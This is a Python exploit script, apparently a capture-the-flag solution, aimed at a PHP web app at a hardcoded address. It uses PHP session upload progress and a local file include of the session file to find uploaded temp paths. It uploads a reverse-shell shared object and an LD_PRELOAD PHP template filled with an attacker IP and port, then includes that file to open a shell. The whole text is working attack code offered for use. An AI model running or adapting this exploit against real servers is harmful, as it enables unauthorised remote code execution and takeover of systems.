from requests import *
import threading
import time
import re

targetUrl = "http://34.131.30.75:31337/"

def uploadSO(sess):

	url = targetUrl + "?mode=chance&chance=for(;;){}"
	data = {"PHP_SESSION_UPLOAD_PROGRESS":"NGA"}
	files = {"file" : open('ReverseShell.so',"rb")}
	cookies = {'PHPSESSID':sess}
	res = post(url, data=data, files=files, cookies=cookies)

def uploadPHP(sess, ip, port, soFile):

	url = targetUrl + "?mode=chance&chance=for(;;){}"

	php = open("LD_PRELOAD.php","r").read()
	php = php.replace("[IP]", ip)
	php = php.replace("[PORT]", port)
	php = php.replace("[soFile]", soFile)

	data = {"PHP_SESSION_UPLOAD_PROGRESS":"NGA"}
	files = {"file" : ("LD_PRELOAD.php",php)}
	cookies = {"PHPSESSID": sess}
	res = post(url, data=data, files=files, cookies=cookies)
	
def getPath(sess):

	p = re.compile('"tmp_name";s:14:"(.*?)";')
	url = targetUrl + "?bonus=/var/lib/php/sessions/sess_{}".format(sess)
	res = get(url)
	tmpFile = p.findall(res.text)[0]
	return tmpFile

def exploit(ip, port):

	t1 = threading.Thread(target=uploadSO,args=("NGA01",))
	t1.start()
	time.sleep(1)
	soFile = getPath("NGA01")
	print("SO FILE: ", soFile)

	t2 = threading.Thread(target=uploadPHP,args=("NGA02", ip, port, soFile))
	t2.start()
	time.sleep(1)
	phpFile = getPath("NGA02")
	print("PHP FILE: ", phpFile)

	url = targetUrl + "?bonus={}".format(phpFile)
	res = get(url)
	print("Attach Shell")

if __name__ == '__main__':

	ip = ""
	port = ""
	exploit(ip, port)	

